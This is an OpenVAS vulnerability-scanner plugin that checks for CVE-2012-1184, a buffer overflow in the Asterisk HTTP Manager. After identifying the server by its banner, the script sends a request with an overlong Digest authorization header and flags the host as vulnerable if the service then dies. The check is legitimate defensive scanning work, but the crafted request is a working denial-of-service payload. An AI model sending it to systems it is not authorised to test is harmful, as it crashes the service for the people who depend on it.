##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_asterisk_http_manager_bof_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Asterisk HTTP Manager Buffer Overflow Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to execute arbitrary code
  within the context of the application or cause a denial of service condition.
  Impact Level: System/Application";
tag_affected = "Asterisk version 1.8.x before 1.8.10.1, 10.x before 10.2.1 and 10.3.0";

tag_insight = "The flaw is due to an error in the 'ast_parse_digest()' function
  (main/utils.c) in HTTP Manager, which fails to handle
  'HTTP Digest Authentication' information sent via a crafted request with
  an overly long string.";
tag_solution = "Upgrade to Asterisk 1.8.10.1, 10.2.1 or later,
  For updates refer to http://downloads.asterisk.org/pub/security/AST-2012-003.html";
tag_summary = "This host is running Asterisk and is prone to buffer overflow
  vulnerability.";

if(description)
{
  script_id(802838);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-1184");
  script_bugtraq_id(52815);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-04-23 16:56:33 +0530 (Mon, 23 Apr 2012)");
  script_name("Asterisk HTTP Manager Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/80126");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/48417/");
  script_xref(name : "URL" , value : "http://securitytracker.com/id/1026813");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/74083");
  script_xref(name : "URL" , value : "https://issues.asterisk.org/jira/browse/ASTERISK-19542");
  script_xref(name : "URL" , value : "http://downloads.asterisk.org/pub/security/AST-2012-003.html");

  script_description(desc);
  script_summary("Check if Asterisk HTTP Manager is vulnerable to DoS");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_require_ports("Services/www", 8080, 8088);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
req = "";
res = "";
host = "";
asterPort = 0;
asterBanner = "";

## Asterisk HTTP port
asterPort = get_http_port(default:8080);
if(!asterPort){
  asterPort = 8088;
}

## Check port state
if(!get_port_state(asterPort)){
  exit(0);
}

## Get Host name
host = get_host_name();
if(!host){
  exit(0);
}

## Confirm the application before trying exploit
asterBanner = get_http_banner(port: asterPort);
if(asterBanner && "Server: Asterisk" >< asterBanner)
{
  ##Construct a crafted request
  req = string("GET /amxml HTTP/1.1\r\n",
               "Host: ", host, ":", asterPort, "\r\n",
               "Authorization: Digest ", crap(data: "a", length: 700), "\r\n\r\n");

  ## Send crafted request
  res = http_keepalive_send_recv(port:asterPort, data:req);

  ## Confirm Asterisk HTTP Manager is dead
  if(http_is_dead(port:asterPort)){
    security_hole(asterPort);
  }
}
